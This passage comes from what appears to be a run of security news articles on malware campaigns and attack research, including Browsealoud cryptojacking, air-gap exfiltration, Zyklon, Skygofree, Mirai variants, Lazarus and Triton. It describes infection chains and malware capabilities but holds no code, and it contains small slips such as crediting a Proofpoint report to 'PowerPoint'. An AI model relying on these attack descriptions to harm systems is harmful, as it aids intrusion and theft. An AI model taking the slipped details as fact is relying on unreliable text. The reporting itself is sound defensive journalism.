cybercriminals, as \"all the exploitation cases that [the researchers] detected occurring in Russia,\" and a lot of artifacts pointed towards Russian cybercriminals. The best way to protect yourself from such attacks is not to download or open files from unknown or untrusted sources. The security firm also recommended users to avoid sharing any sensitive personal information in messaging apps and make sure to have a good antivirus software from reliable company installed on your systems." }

Thousands of government websites around the world have been found infected with a specific script that secretly forces visitors' computers to mine cryptocurrency for attackers. The cryptocurrency mining script injection found on over 4,000 websites, including those belonging to UK's National Health Service (NHS), the Student Loan Company, and data protection watchdog Information Commissioner's Office (ICO), Queensland legislation, as well as the US government's court system. Users who visited the hacked websites immediately had their computers' processing power hijacked, also known as cryptojacking, to mine cryptocurrency without their knowledge, potentially generating profits for the unknown hacker or group of hackers. It turns out that hackers managed to hijack a popular third-party accessibility plugin called \"Browsealoud,\" used by all these affected websites, and injected their cryptocurrency-mining script into its code. Browsealoud is a popular third-party browser plugin that helps blind and partially-sighted users access the web by converting site text to audio. The script that was inserted into the compromised Browsealoud software belongs to CoinHive—a browser-based Monero mining service that offers website administrators to earn revenue by utilizing CPU resources of visitors. The mining software was found in more than 4,200 websites, including The City University of New York (cuny.edu), Uncle Sam's court information portal (uscourts.gov), the UK's Student Loans Company (slc.co.uk), privacy watchdog The Information Commissioner's Office (ico.org.uk) and the Financial Ombudsman Service (financial-ombudsman.org.uk), UK NHS services, Manchester.gov.uk, NHSinform.scot, agriculture.gov.ie, Croydon.gov.uk, ouh.nhs.uk, legislation.qld.gov.au, the list goes on. The full list of affected websites can be found here. After UK-based infosec consultant Scott Helme raised the alarm about this hack when one of his friends mentioned getting anti-virus alerts on a UK Government website, BrowseAloud’s operator Texthelp took down its site to resolve the issue. Here’s what Texthelp's chief technology officer Martin McKay said in a blog post: \"In light of other recent cyber attacks all over the world, we have been preparing for such an incident for the last year. Our data security action plan was actioned straight away and was effective, the risk was mitigated for all customers within a period of four hours.\" \"Texthelp has in place continuously automated security tests for Browsealoud - these tests detected the modified file, and as a result, the product was taken offline.\" This action eventually removed Browsealoud from all websites immediately, addressing the security issue without its customers having to take any action. The company also assured that \"no customer data has been accessed or lost,\" and that its customers will receive a further update as soon as the security investigation gets completed." }

Air-gapped computers are those that are isolated from the Internet and local networks and so, are believed to be the most secure devices that are difficult to infiltrate. Whereas, Faraday cages are metallic enclosures that even blocks all electromagnetic signals, such as Wi-Fi, Bluetooth, cellular and other wireless communications, making any device kept inside the cage, even more, isolate from outside networks. However, Cybersecurity Research Center at Israel's Ben Gurion University, directed by 38-year-old Mordechai Guri, has developed two techniques that helped them exfiltrate data from computers placed inside a Faraday cage. Dubbed MAGNETO [pdf] and ODINI [pdf], both the techniques make use of proof-of-concept (PoC) malware installed on an air-gapped computer inside the Faraday cage to control the \"magnetic fields emanating from the computer by regulating workloads on the CPU cores\" and use it to transmit data stealthily. \"Everyone was talking about breaking the air gap to get in, but no one was talking about getting the information out,\" Guri says. \"That opened the gate to all this research, to break the paradigm that there's a hermetic seal around air-gapped networks.\" According to the researcher, once a computer (no matter if it is air-gapped or inside a Faraday cage) has been infected, hackers can exfiltrate stolen data without needing to wait for another traditional connection to the infected machine. How MAGNETO & ODINI Attacks Work: Once a motivated attacker somehow succeeded in planting malware on an air-gapped computer, the malware then collects small pieces of information, like keylogging data, encryption keys, credential tokens, and passwords. Also Read: CIA developed Malware for Hacking Air-Gapped Networks. The PoC malware developed by the team then electrically generates a pattern of magnetic field frequencies by regulating CPU's workload, which can be achieved by overloading the CPU with calculations that increase power consumption and generate a stronger magnetic field. These electromagnetic (acoustic, optical and thermal) emissions from the infected computer are powerful enough to carry a small stream of stolen data to a nearby device, a receiver planted by the hacker. The process involves translating data first into binary, i.e. 0 and 1, and the transmitting it into morse-code-like patterns in accordance with electromagnetic emission. \"The transmitting program leaves only a small footprint in the memory, making its presence easier to hide from AVs. At the OS level, the transmitting program requires no special or elevated privileges (e.g., root or admin), and hence can be initiated from an ordinary userspace process,\" the paper reads. \"The transmitting code mainly consists of basic CPU operations such as busy loops, which do not expose malicious behaviors, making it highly evasive from automated analysis tools.\" Also Read: Stealing Data from Air-Gapped Computers Using CCTV Cameras While both MAGNETO and ODINI attacks are designed to exfiltrate data from a secured computer using electromagnetic emissions, the only difference between the two is: MAGNETO is a short-distance attack where an Android app installed on the attacker's smartphone can receive stolen data with the help of phone's magnetometer— a magnetic sensor that can transmit data even if the smartphone is placed inside a Faraday bag or is set to airplane mode. ODINI attack enables attackers to capture electromagnetic signals from a slightly longer range using a dedicated magnetic sensor. In case of MAGNETO, the team managed to achieve only up to 5 bits/sec over a distance of up to 12.5 cm (5 inches), while ODINI is quite more efficient with a maximum transfer rate of 40 bits/sec over a range of 100 to 150 cm (3-5 feet). Both ODINI and MAGNETO also work if the targeted air-gapped device is inside a Faraday cage, which is designed to block electromagnetic fields, including Bluetooth, Wi-Fi, cellular, and other wireless communications. Researchers suggest three different approaches that can be used to prevent attackers from establishing a covert magnetic channel, i.e., shielding, jamming, and zoning. Video Demonstration of MAGNETO And ODINI Attacks The team published proof-of-concept video demonstrations for both MAGNETO and ODINI attacks, which shows both the attacks in action. It's not the first time Ben-Gurion researchers came up with a covert technique to target air-gapped computers. Their previous research of hacking air-gap computers include: aIR-Jumper attack that steals sensitive information from air-gapped computers with the help of infrared-equipped CCTV cameras that are used for night vision. USBee attack that can be used steal data from air-gapped computers using radio frequency transmissions from USB connectors. DiskFiltration attack that can steal data using sound signals emitted from the hard disk drive (HDD) of the targeted air-gapped computer; BitWhisper that relies on heat exchange between two computer systems to stealthily siphon passwords or security keys; AirHopper that turns a computer's video card into an FM transmitter to capture keystrokes; Fansmitter technique that uses noise emitted by a computer fan to transmit data; and GSMem attack that relies on cellular frequencies." }

Dubbed Operation PZChao, the attack campaign discovered by the security researchers at Bitdefender have been targeting organizations in the government, technology, education, and telecommunications sectors in Asia and the United States. Researchers believe nature, infrastructure, and payloads, including variants of the Gh0stRAT trojan, used in the PZChao attacks are reminiscent of the notorious Chinese hacker group—Iron Tiger. However, this campaign has evolved its payloads to drop trojan, conduct cyber espionage and mine Bitcoin cryptocurrency. The PZChao campaign is attacking targets across Asia and the U.S. by using similar attack tactics as of Iron Tiger, which, according to the researchers, signifies the possible return of the notorious Chinese APT group. Since at least July last year, the PZChao campaign has been targeting organizations with a malicious VBS file attachment that delivers via highly-targeted phishing emails. If executed, the VBS script downloads additional payloads to an affected Windows machine from a distribution server hosting \"down.pzchao.com,\" which resolved to an IP address (125.7.152.55) in South Korea at the time of the investigation. The threat actors behind the attack campaign have control over at least five malicious subdomains of the \"pzchao.com\" domain, and each one is used to serve specific tasks, like download, upload, RAT related actions, malware DLL delivery. The payloads deployed by the threat actors are \"diversified and include capabilities to download and execute additional binary files, collect private information and remotely execute commands on the system,\" researchers noted. The first payload dropped on the compromised machines is a Bitcoin miner, disguised as a 'java.exe' file, that mines cryptocurrency every three weeks at 3 AM, when most people are not in front of their systems. For password stealing, the malware also deploys one of two versions of the Mimikatz password-scraping utility (depending on the operating architecture of the affected machine) to harvest passwords and upload them to the command and control server. PZChao's final payload includes a slightly modified version of Gh0st remote access trojan (RAT) which is designed to act as a backdoor implant and behaves very similar to the versions detected in cyber attacks associated with the Iron Tiger APT group. The Gh0st RAT is equipped with massive cyber-espionage capabilities, including: Real-time and offline remote keystroke logging Listing of all active processes and opened windows Listening in on conversations via microphone Eavesdropping on webcams' live video feed Allowing for remote shutdown and reboot of the system Downloading binaries from the Internet to remote host Modifying and stealing files and more. All of the above capabilities allows a remote attacker to take full control of the compromised system, spy on the victims and exfiltrate confidential data easily. While the tools used in the PZChao campaign are a few years old, \"they are battle-tested and more than suitable for future attacks,\" researchers say. Active since 2010, Iron Tiger, also known as \"Emissary Panda\" or \"Threat Group-3390,\" is a Chinese advanced persistent threat (APT) group that was behind previous campaigns resulting in the theft of massive amounts of data from the directors and managers of US-based defense contractors. Similar to the PZChao campaign, the group also carried out attacks against entities in China, the Philippines, and Tibet, besides attacking targets in the U.S. For further insights, you can read the detailed technical paper [PDF] published by Bitdefender." }

Spectre and Meltdown are security vulnerabilities disclosed by security researchers earlier this month in many processors from Intel, ARM and AMD used in modern PCs, servers and smartphones, among other devices. These CPU vulnerabilities could enable attackers to bypass memory isolation mechanisms and access everything, including memory allocated for the kernel containing sensitive data like passwords, encryption keys and other private information. Researchers from independent antivirus testing firm AV-TEST detected at least 139 malware samples, as of today, which are related to these CPU vulnerabilities, as shown in the growth graph. You can find SHA256 hashes for all malware samples here. Meanwhile, cybersecurity firm Fortinet also tracked and analyzed many malware samples 'trying to exploit' recently disclosed CPU vulnerabilities, most of which includes re-compiled or extended version of the JavaScript-based proof-of-concept (PoC) exploit released last month. \"The rate at which the cybercriminal community is targeting known vulnerabilities is clearly accelerating, with the WannaCry and NotPetya exploits serving as perfect examples of the need to patch vulnerable systems as soon as possible,\" Fortinet said. \"Which is why our concerns were raised when we recently learned about some of the largest vulnerabilities ever reported—ones that affect virtually every processor developed since 1995 by chip manufacturers Intel, AMD, and ARM.\" Another news makes this situation, even more, worse—Intel halted all its CPU firmware patches for the Meltdown and Spectre flaws last week after it caused issues like spontaneous reboots and other 'unpredictable' system behaviour on affected PCs. So, until Intel and other vendors do not come up with stable security patches for the Meltdown and Spectre attacks that don’t cause systems to break, users are recommended to keep their operating system, web browsers, antivirus and other software up-to-date." }

Dubbed Zyklon, the fully-featured malware has resurfaced after almost two years and primarily found targeting telecommunications, insurance and financial services. Active since early 2016, Zyklon is an HTTP botnet malware that communicates with its command-and-control servers over Tor anonymising network and allows attackers to remotely steal keylogs, sensitive data, like passwords stored in web browsers and email clients. Zyklon malware is also capable of executing additional plugins, including secretly using infected systems for DDoS attacks and cryptocurrency mining. Different versions of the Zyklon malware has previously been found being advertised on a popular underground marketplace for $75 (normal build) and $125 ( Tor-enabled build). According to a recently published report by FireEye, the attackers behind the campaign are leveraging three following vulnerabilities in Microsoft Office that execute a PowerShell script on the targeted computers to download the final payload from its C&C server. 1) .NET Framework RCE Vulnerability (CVE-2017-8759)—this remote code execution vulnerability exists when Microsoft .NET Framework processes untrusted input, allowing an attacker to take control of an affected system by tricking victims into opening a specially crafted malicious document file sent over an email. Microsoft already released a security patch for this flaw in September updates. 2) Microsoft Office RCE Vulnerability (CVE-2017-11882)—it’s a 17-year-old memory corruption flaw that Microsoft patched in November patch update allows a remote attacker to execute malicious code on the targeted systems without requiring any user interaction after opening a malicious document. 3) Dynamic Data Exchange Protocol (DDE Exploit)—this technique allows attackers to leverage a built-in feature of Microsoft Office, called DDE, to perform code execution on the targeted device without requiring Macros to be enabled or memory corruption. As explained by the researchers, attackers are actively exploiting these three vulnerabilities to deliver Zyklon malware using spear phishing emails, which typically arrives with an attached ZIP file containing a malicious Office doc file. Once opened, the malicious doc file equipped with one of these vulnerabilities immediately runs a PowerShell script, which eventually downloads the final payload, i.e., Zyklon HTTP malware, onto the infected computer. \"In all these techniques, the same domain is used to download the next level payload (Pause.ps1), which is another PowerShell script that is Base64 encoded,\" the FireEye researchers said. \"The Pause.ps1 script is responsible for resolving the APIs required for code injection. It also contains the injectable shellcode.\" \"The injected code is responsible for downloading the final payload from the server. The final stage payload is a PE executable compiled with .Net framework.\" Interestingly, the PowerShell script connects to a dotless IP address (example: http://3627732942) to download the final payload. What is Dotless IP Address? If you are unaware, dotless IP addresses, sometimes referred as 'Decimal Address,' are decimal values of IPv4 addresses (represented as dotted-quad notation). Almost all modern web browsers resolve decimal IP address to its equivalent IPV4 address when opened with \"http://\" following the decimal value. For example, Google's IP address 216.58.207.206 can also be represented as http://3627732942 in decimal values (Try this online converter). The best way to protect yourself and your organisation from such malware attacks are always to be suspicious of any uninvited document sent via an email and never click on links inside those documents unless adequately verifying the source. Most importantly, always keep your software and systems up-to-date, as threat actors incorporate recently discovered, but patched, vulnerabilities in popular software—Microsoft Office, in this case—to increase the potential for successful infections." }

Dubbed Skygofree, the Android spyware has been designed for targeted surveillance, and it is believed to have been targeting a large number of users for the past four years. Since 2014, the Skygofree implant has gained several novel features previously unseen in the wild, according to a new report published by Russian cybersecurity firm Kaspersky Labs. The 'remarkable new features' include location-based audio recording using device's microphone, the use of Android Accessibility Services to steal WhatsApp messages, and the ability to connect infected devices to malicious Wi-Fi networks controlled by attackers. Skygofree is being distributed through fake web pages mimicking leading mobile network operators, most of which have been registered by the attackers since 2015—the year when the distribution campaign was most active, according to Kaspersky's telemetry data. Italian IT Firm Behind Skygofree Spyware? Researchers at Kaspersky Lab believe the hacker or hacking group behind this mobile surveillance tool has been active since 2014 and are based in Italy—the home for the infamous 'Hacking Team'—one of the world's bigger players in spyware trading. \"Given the many artifacts we discovered in the malware code, as well as infrastructure analysis, we are pretty confident that the developer of the Skygofree implants is an Italian IT company that works on surveillance solutions, just like HackingTeam,\" said the report. Kaspersky found several Italian devices infected with Skygofree, which the firm described as one of the most powerful, advanced mobile implants it has ever seen. Although the security firm has not confirmed the name of the Italian company behind this spyware, it found multiple references to Rome-based technology company \"Negg\" in the spyware's code. Negg is also specialised in developing and trading legal hacking tools. Skygofree: Powerful Android Spyware Tool Once installed, Skygofree hides its icon and starts background services to conceal further actions from the user. It also includes a self-protection feature, preventing services from being killed. As of October last year, Skygofree became a sophisticated multi-stage spyware tool that gives attackers full remote control of the infected device using a reverse shell payload and a command and control (C&C) server architecture. According to the technical details published by researchers, Skygofree includes multiple exploits to escalate privileges for root access, granting it ability to execute most sophisticated payloads on the infected Android devices. One such payload allows the implant to execute shellcode and steal data belonging to other applications installed on the targeted devices, including Facebook, WhatsApp, Line, and Viber. \"There are multiple, exceptional capabilities: usage of multiple exploits for gaining root privileges, a complex payload structure, [and] never-before-seen surveillance features,\" the researchers said. Skygofree’s control (C&C) server also allows attackers to capture pictures and videos remotely, seize call records and SMS, as well as monitor the users' geolocation, calendar events and any information stored in the device's memory. Besides this, Skygofree also can record audio via the microphone when the infected device was in a specified location and the ability to force the infected device to connect to compromised Wi-Fi networks controlled by the attacker, enabling man-in-the-middle attacks. The spyware uses \"the Android Accessibility Service to get information directly from the displayed elements on the screen, so it waits for the targeted application to be launched and then parses all nodes to find text messages,\" Kaspersky said. Kaspersky researchers also found a variant of Skygofree targeting Windows users, suggesting the authors' next area of interest is the Windows platform. The best way to prevent yourself from being a victim is to avoid downloading apps via third-party websites, app stores or links provided in SMS messages or emails." }

Although the original creators of Mirai DDoS botnet have already been arrested and jailed, the variants of the infamous IoT malware are still in the game due to the availability of its source code on the Internet. Security researchers have spotted a new variant of infamous Mirai IoT malware designed to hijack insecure devices that run on ARC embedded processors. Until now, Mirai and its variants have been targeting CPU architectures—including x86, ARM, Sparc, MIPS, PowerPC and Motorola 6800—deployed in millions of Internet of Things (IoT) devices. Dubbed Okiru, the new Mirai variant, first spotted by @unixfreaxjp from MalwareMustDie team and notified by independent researcher Odisseus, is a new piece of ELF malware that targets ARC-based embedded devices running Linux operating system. \"This is the FIRST TIME ever in the history of computer engineering that there is a malware for ARC CPU, & it is #MIRAI OKIRU!! Pls be noted of this fact, & be ready for the bigger impact on infection Mirai (specially #Okiru) to devices hasn't been infected yet,\" Odisseus tweeted. ARC (Argonaut RISC Core) embedded processor is the world's second-most-popular CPU core that's being shipped in more than 2 billion products every year, including cameras, mobile, utility meters, televisions, flash drives, automotive and the Internet of Things. However, this isn't first Mirai botnet variant based on Linux ELF malware. Mirai also has another ELF-based variant, which was designed to target devices running MIPS and ARM processors. It should also be noted that Okiru, which has previously been also named as Satori IoT botnet (another Mirai variant discovered late last year), is \"very different\" from Satori despite having several similar characteristics, as explained in a Reddit thread. Record-Breaking DDoS? The Calm Before The Storm IoTs are currently being deployed in a large variety of devices throughout your home, businesses, hospitals, and even cities (smart cities), but they're routinely being hacked and used as cyber weapons due to lack of stringent security measures and insecure encryption mechanisms. If you are unaware, the world's largest 1 Tbps DDoS attack so far was launched from just 152,000 infected IoT devices using Mirai botnet, and in a separate attack, just 100,000 devices took down the popular DynDNS service in late 2016. Since Okiru has been ported to target a new range of millions of \"expectedly insecure\" devices running ARC processors, the DDoS attack going to be generated by Okiru botnet would probably be the biggest cyberattack ever. \"From this day, the landscape of #Linux #IoT infection will change. #ARC CPU has produced #IoT devices more than 1 billion per year. So these devices are what the hackers want to aim to infect #ELF #malware with their #DDoS cannons. It's a serious threat will be,\" Odisseus tweeted. The fresh arrival of ARC-based IoT devices into botnet scheme will exponentially raise the number of insecure devices to an unprecedented size, making it easy for hackers to gain control over a large number of poorly configured and vulnerable IoT devices." }

Researchers from security firm Trend Micro are warning users of a new cryptocurrency mining bot which is spreading through Facebook Messenger and targeting Google Chrome desktop users to take advantage of the recent surge in cryptocurrency prices. Dubbed Digmine, the Monero-cryptocurrency mining bot disguises as a non-embedded video file, under the name \"video_xxxx.zip\" (as shown in the screenshot), but is actually contains an AutoIt executable script. Once clicked, the malware infects victim's computer and downloads its components and related configuration files from a remote command-and-control (C&C) server. Digimine primarily installs a cryptocurrency miner, i.e. miner.exe—a modified version of an open-source Monero miner known as XMRig—which silently mines the Monero cryptocurrency in the background for hackers using the CPU power of the infected computers. Besides the cryptocurrency miner, Digimine bot also installs an autostart mechanism and launch Chrome with a malicious extension that allows attackers to access the victims' Facebook profile and spread the same malware file to their friends' list via Messenger. Since Chrome extensions can only be installed via official Chrome Web Store, \"the attackers bypassed this by launching Chrome (loaded with the malicious extension) via command line.\" \"The extension will read its own configuration from the C&C server. It can instruct the extension to either proceed with logging in to Facebook or open a fake page that will play a video\" Trend Micro researchers say. \"The decoy website that plays the video also serves as part of their C&C structure. This site pretends to be a video streaming site but also holds a lot of the configurations for the malware’s components.\" It's noteworthy that users opening the malicious video file through the Messenger app on their mobile devices are not affected. Since the miner is controlled from a C&C server, the authors behind Digiminer can upgrade their malware to add different functionalities overnight. Digmine was first spotted infecting users in South Korea and has since spread its activities to Vietnam, Azerbaijan, Ukraine, Philippines, Thailand, and Venezuela. But since Facebook Messenger is used worldwide, there are more chances of the bot being spread globally. When notified by Researchers, Facebook told it had taken down most of the malware files from the social networking site. Facebook Spam campaigns are quite common. So users are advised to be vigilant when clicking on links and files provided via the social media site platform." }

Security researchers have uncovered a new widespread malware campaign targeting cryptocurrency users, believed to be originated from Lazarus Group, a state-sponsored hacking group linked to the North Korean government. Active since 2009, Lazarus Group has been attributed to many high profile attacks, including Sony Pictures Hack, $81 million heists from the Bangladesh Bank, and the latest — WannaCry. The United States has officially blamed North Korea for global WannaCry ransomware attack that infected hundreds of thousands of computers across more than 150 countries earlier this year. In separate news, security experts have blamed Lazarus group for stealing bitcoins worth millions from the South Korean exchange Youbit, forcing it to shut down and file for bankruptcy after losing 17% of its assets. Researchers from security firm Proofpoint have published a new report, revealing a connection between Lazarus Group and a number of multistage cyber attacks against cryptocurrency users and point-of-sale systems. \"The group has increasingly focused on financially motivated attacks and appears to be capitalizing on both the increasing interest and skyrocketing prices for cryptocurrencies,\" the researchers said. \"The Lazarus Group’s arsenal of tools, implants, and exploits is extensive and under constant development.\" After analyzing a large number of spear phishing emails with different attack vectors from multiple spear phishing campaigns, researchers discovered a new PowerShell-based reconnaissance implant from Lazarus Group arsenal, dubbed PowerRatankba. Encryption, obfuscation, functionality, decoys, and command-and-control servers used by PowerRatankba closely resembles the original Ratankba implant developed by Lazarus Group. The PowerRatankba implant is being spread using a massive email campaign through the following attack vectors: Windows executable downloader dubbed PowerSpritz Malicious Windows Shortcut (LNK) files Several malicious Microsoft Compiled HTML Help (CHM) files Multiple JavaScript (JS) downloaders Macro-based Microsoft Office documents Backdoored popular cryptocurrency applications hosted on fake websites PowerRatankba, with at least two variants in the wild, acts as a first-stage malware that delivers a fully-featured backdoor (in this case, Gh0st RAT) only to those targeted companies, organizations, and individuals that have interest in cryptocurrency. \"During our research, we discovered that long-term sandboxing detonations of PowerRatankba not running cryptocurrency related applications were never infected with a Stage2 implant. This may indicate that the PowerRatankba operator(s) were only interested in infecting device owners with an obvious interest in various cryptocurrencies,\" reads the 38-page-long report [PDF] published by Proofpoint. Once installed, Gh0st RAT allows cybercriminals to steal credentials for cryptocurrency wallets and exchanges. It's notable that PowerRatankba and Gh0st RAT don't exploit any zero-day vulnerability; instead, Lazarus Group relies on mixed programming practices, like C&C communication over HTTP, use of Spritz encryption algorithm and the Base64-encoded custom encryptor. \"It is already well-known that Lazarus Group has targeted and successfully breached several prominent cryptocurrency companies and exchanges,\" the researchers say. \"From these breaches, law enforcement agencies suspect that the group has amassed nearly $100 million worth of cryptocurrencies based on their value today.\" Besides stealing cryptocurrencies, the group was also found infecting SoftCamp point-of-sale (POS) terminals, largely deployed in South Korea, using RatankbaPOS malware for stealing credit card data. Since RatankbaPOS was sharing same C&C server as the PowerRatankba implant, it is believed that both the implants are linked to Lazarus Group. The explosive growth in cryptocurrency values has motivated not only traders but also hackers to invest all their time and resources in making digital wealth. More details about the new malware campaigns run by Lazarus Group can be found in the in-depth report [PDF], titled \"North Korea Bitten by Bitcoin Bug—Financially motivated campaigns reveal a new dimension of the Lazarus Group,\" published by PowerPoint on Wednesday." }

Just last week, researchers from AdGuard discovered that some popular video streaming and ripper sites including openload, Streamango, Rapidvideo, and OnlineVideoConverter hijacks CPU cycles from their over hundreds of millions of visitors for mining Monero cryptocurrency. Now, researchers from Moscow-based cyber security firm Kaspersky Lab have uncovered a new strain of Android malware lurking in fake anti-virus and porn applications, which is capable of performing a plethora of nefarious activities—from mining cryptocurrencies to launching Distributed Denial of Service (DDoS) attacks. Dubbed Loapi, the new Android Trojan can perform so many more malicious activities at a time that can exploit a handset to the extent that within just two days of infection it can cause the phone's battery to bulge out of its cover. Described as a \"jack-of-all-trades\" by the researchers, Loapi has a modular architecture that lets it conduct a variety of malicious activities, including mining the Monero cryptocurrency, launching DDoS attacks, bombarding infected users with constant ads, redirecting web traffic, sending text messages, and downloading and installing other apps. Loapi Destroyed An Android Phone In Just 2 Days When analyzed a Loapi sample, Kaspersky's researchers discovered that the malware mines the Monero cryptocurrency so intensely that it destroyed an Android phone after two days of testing, causing the battery to bulge and deforming the phone cover. According to researchers, the cybercriminals behind Loapi are the same responsible for the 2015 Android malware Podec. They are distributing the malware through third-party app stores and online advertisements that pose as apps for \"popular antivirus solutions and even a famous porn site.\" A screenshot in the Kaspersky blog suggests that Loapi impersonates as at least 20 variations of adult-content apps and legitimate antivirus software from AVG, Psafe DFNDR, Kaspersky Lab, Norton, Avira, Dr. Web and CM Security, among others. Upon installation, Loapi forces the user to grant it 'device administrator' permissions by looping a pop-up until a victim clicks yes, which gives the malicious app the same power over your smartphone that you have. This highest level privilege on a device would also make the Loapi malware ideal for user espionage, though this capability is not yet present in the malware, the Kaspersky researchers think this can be included in the future. Loapi Malware Aggressively Fights to Protect Itself Researchers also said the malware \"aggressively fights any attempts to revoke device manager permissions\" by locking the screen and closing phone windows by itself. Loapi communicates with the module-specific command and control (C&C) servers, including advertisement module, SMS module and mining module, web crawler, and proxy module, for different functions to be performed on the infected device. By connecting with one of the above-mentioned C&C servers, Loapi sends a list of legitimate antivirus apps that pose it danger and claims the real app as malware and urges the user to delete it by showing the pop-up in a loop until the user finally deletes the app. \"Loapi is an interesting representative from the world of malicious Android apps. It’s creators have implemented almost the entire spectrum of techniques for attacking devices: the Trojan can subscribe users to paid services, send SMS messages to any number, generate traffic and make money from showing advertisements, use the computing power of a device to mine cryptocurrencies, as well as perform a variety of actions on the internet on behalf of the user/device,\" the researchers concluded. Fortunately, Loapi failed to make its ways to Google Play Store, so users who stick to downloads from the official app store are not affected by the malware. But you are advised to remain vigilant even when downloading apps from Play Store as malware often makes its ways to infect Android users." }

Dubbed Triton, also known as Trisis, the ICS malware has been designed to target Triconex Safety Instrumented System (SIS) controllers made by Schneider Electric—an autonomous control system that independently monitors the performance of critical systems and takes immediate actions automatically, if a dangerous state is detected. Researchers from the Mandiant division of security firm FireEye published a report on Thursday, suggesting state-sponsored attackers used the Triton malware to cause physical damage to an organization. Neither the targeted organization name has been disclosed by the researchers nor they have linked the attack to any known nation-state hacking group. According to separate research conducted by ICS cybersecurity firm Dragos, which calls this malware \"TRISIS,\" the attack was launched against an industrial organization in the Middle East. Triton leverages the proprietary TriStation protocol, which is an engineering and maintenance tool used by Triconex SIS products and is not publicly documented, suggesting that the attackers reverse engineered it when creating their malware. \"The attacker gained remote access to an SIS engineering workstation and deployed the TRITON attack framework to reprogram the SIS controllers,\" FireEye researchers said. The hackers deployed Triton on an SIS engineering workstation running Windows operating system by masquerading it as the legitimate Triconex Trilog application. The current version of TRITON malware that researchers analyzed was built with many features, “including the ability to read and write programs, read and write individual functions and query the state of the SIS controller.” \"During the incident, some SIS controllers entered a failed safe state, which automatically shut down the industrial process and prompted the asset owner to initiate an investigation,\" the researchers said. Using TRITON, an attacker can typically reprogram the SIS logic to falsely shut down a process that is actuality in a safe state. Though such scenario would not cause any physical damage, organizations can face financial losses due to process downtime. Besides this, attackers can also cause severe life-threatening damages by reprogramming the SIS logic to allow unsafe conditions to persist or by intentionally manipulating the processes to achieve unsafe state first. \"The attacker deployed TRITON shortly after gaining access to the SIS system, indicating that they had pre-built and tested the tool which would require access to hardware and software that is not widely available.\" Researchers believe Triton is emerging as a severe threat to critical infrastructures, just like Stuxnet, IronGate, and Industroyer, because of its capabilities to cause physical damage or shut down operations. Researchers at Symantec have also provided a brief analysis here." }

According to the federal court documents unsealed Tuesday, Paras Jha (21-year-old from New Jersey), Josiah White (20-year-old Washington) and Dalton Norman (21-year-old from Louisiana) were indicted by an Alaska court last week on multiple charges for their role in massive cyber attacks conducted using Mirai botnet. Mirai is a piece of nasty IoT malware that scans for insecure routers, cameras, DVRs, and other Internet of Things devices which are still using their default passwords and then add them into a botnet network, which is then used to launch DDoS attacks on websites and Internet infrastructure. According to his plea agreement, Jha \"conspired to conduct DDoS attacks against websites and web hosting companies located in the United States and abroad\" by ensnaring over 300,000 IoT devices. He also demanded payment \"in exchange for halting the attack.\" Between September and October 2016, Jha advertised Mirai botnet on multiple dark web forums using the online monikers \"Anna Senpai.\" He also admitted to securely wiping off the virtual machine used to run Mirai on his device and then posting the source code of Mirai online for free. Since then, other cybercriminals have used the open-source code of the botnet to create their own Mirai variants in a variety of different cyber attacks against their targets. Paras Jha (a.k.a Anna Senpai) and his business partner Josiah White (a.k.a Lightspeed and thegenius) are the same people who were outed by blogger Brian Krebs earlier this year after his blog was also knocked offline by a massive 620 Gbps of DDoS attack using Mirai botnet. According to Jha’s LinkedIn profile, he is a 21-year-old passionate programmer from Fanwood, U.S., who knows how to code in multiple programming languages and is positioned as president of a DDoS mitigation firm, ProTraf Solutions. White admitted to creating the Mirai botnet's scanner to identify and hijack vulnerable internet-connected devices to enlist in the botnet, while Norman (a.k.a Drake) admitted to identifying private zero-day vulnerabilities and exploits to build into the massive botnet. From December 2016 to February 2017, the trio successfully infected more than 100,000 computing devices to form another powerful botnet, called Clickfraud, which was designed to scam online ad networks by simulating clicks on ads for the purpose of artificially generating revenue. A week after the massive DDoS attack, the source code of Mirai was released on the widely used hacker chat forum Hackforums by Jha who, under the name Anna-senpai, wrote he had \"made their money...so it's time to GTFO.\" \"So today, I have an amazing release for you,\" he wrote. \"With Mirai, I usually pull max 380k bots from telnet alone. However, after the Kreb [sic] DDoS, ISPs been slowly shutting down and cleaning up their act. Today, max pull is about 300k bots, and dropping.\" Once Mirai source code was out, various cyber criminals started exploiting the IoT malware to launch powerful DDoS attacks against websites and Internet infrastructure, one of which was the popular DNS provider Dyn, which was DDoSed by a botnet of an around 100,000 Mirai malware-infected devices. \"The defendants’ involvement with the original Mirai variant ended in the fall of 2016, when Jha posted the source code for Mirai on a criminal forum. Since then, other criminal actors have used Mirai variants in a variety of other attacks.\" DOJ said in a press release. The trio faces a sentence of up to five years in prison. This article has been updated to add comments from and information provided by the U.S. Justice of Department about the three defendants." }

The same happened once again when security researchers discovered at least 85 applications in Google Play Store that were designed to steal credentials from users of Russian-based social network VK.com and were successfully downloaded millions of times. The most popular of all masqueraded as a gaming app with more than a million downloads. When this app was initially submitted in March 2017, it was just a gaming app without any malicious code, according to a blog post published Tuesday by Kaspersky Lab. However, after waiting for more than seven months, the malicious actors behind the app updated it with information-stealing capabilities in October 2017. Besides this gaming app, the Kaspersky researchers found 84 such apps on Google Play Store—most of them were uploaded to the Play Store in October 2017 and stealing credentials for VK.com users. Other popular apps that were highly popular among users include seven apps with between 10,000 and 100,000 installations, nine with between 1,000 and 10,000 installations, and rest of all had fewer than 1,000 installations. Here's How Cyber Criminals Steal Your Account Credentials: The apps used an official SDK for VK.com but slightly modified it with malicious JavaScript code in an effort to steal users' credentials from the standard login page of VK and pass them back to the apps. Since these apps looked like they came from VK.com – for listening to music or for monitoring user page visits, requiring a user to login into his/her account through a standard login page did not look suspicious at all. The stolen credentials were then encrypted and uploaded to a remote server controlled by the attackers. \"The interesting thing is that although most of these malicious apps had a described functionality, a few of them were slightly different—they also used malicious JS code from the OnPageFinished method, but not only for extracting credentials but for uploading them too,\" Kaspersky said. Researchers believe that the cybercriminals use stolen credentials mostly for promoting groups in VK.com, by silently adding users to promote various groups and increase their popularity by doing so, since they received complaints from some infected users that their accounts had been silently added to unknown groups. The cybercriminals behind these apps had been publishing their malicious apps on the Play Store for more than two years, so all they had to do is modify their apps to evade detection. Since VK.com is popular mostly among users in CIS countries, the malicious apps were targeting Russian, Ukrainian, Kazakh, Armenian, Azerbaijani, Romanian, Belarusian, Kyrgyz, Tajik, and Uzbek users. The apps did so by first checking the device language and asked for login credentials from users with one of the above-mentioned languages. In addition, researchers also noted that they found several other apps on Google Play Store that were submitted by the same cyber criminals and published as unofficial clients for the popular messaging app Telegram. \"These apps were not only masquerading as Telegram apps, they were actually built using an open source Telegram SDK and work almost like every other such app,\" the researchers said, adding that these apps also add infected users to promoted groups/chats 